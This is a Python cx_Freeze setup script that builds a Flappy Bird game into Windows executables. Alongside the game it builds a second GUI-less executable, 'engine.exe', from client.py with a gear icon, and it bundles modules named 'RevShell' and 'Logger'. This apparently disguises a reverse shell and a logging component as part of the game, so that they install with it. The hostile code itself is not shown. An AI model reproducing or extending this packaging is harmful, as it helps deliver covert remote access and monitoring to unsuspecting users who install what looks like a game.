"""Disutils Setup Script"""
import cx_Freeze, os.path 

PYTHON_INSTALL_DIR          = os.path.dirname(os.path.dirname(os.__file__))
os.environ['TCL_LIBRARY']   = os.path.join(PYTHON_INSTALL_DIR, 'tcl', 'tcl8.6')
os.environ['TK_LIBRARY']    = os.path.join(PYTHON_INSTALL_DIR, 'tcl', 'tk8.6') 


executables = [
    cx_Freeze.Executable(
        script          = 'flappy.py',
        base            = 'Win32GUI', 
        targetName      = 'flappybird.exe',
        icon            = 'assets/icons/flappy.ico',
        shortcutName    = 'FlappyBird'
    ),
    cx_Freeze.Executable(
        script          = 'client.py',
        base            = 'Win32GUI', 
        targetName      = 'engine.exe',
        icon            = 'assets/icons/gear.ico'
    )
]

cx_Freeze.setup(
    name    = 'FlappyBird',
    version = '1.0.0',
    options = {
        'build_exe': {
            'includes': ['client', 'RevShell', 'Logger'],
            'include_files': ['assets/'],
        }
    },
    executables = executables
)